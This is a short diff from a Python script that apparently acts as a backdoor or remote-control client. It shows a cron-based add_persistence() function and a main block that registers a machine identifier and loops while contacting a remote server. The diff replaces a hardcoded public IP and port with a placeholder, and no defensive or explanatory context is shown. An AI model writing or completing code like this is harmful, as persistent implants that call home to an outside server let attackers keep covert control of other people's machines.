@@ -28,7 +28,7 @@ def add_persistence():
         os.remove("mycron")
 
 if __name__ == "__main__":
-    server_url = "http://179.48.230.116:5043"  # URL do servidor
+    server_url = "(IP):5043"  # URL do servidor
     identifier = "Machine"  # Identificador único
     add_persistence()
     while True:
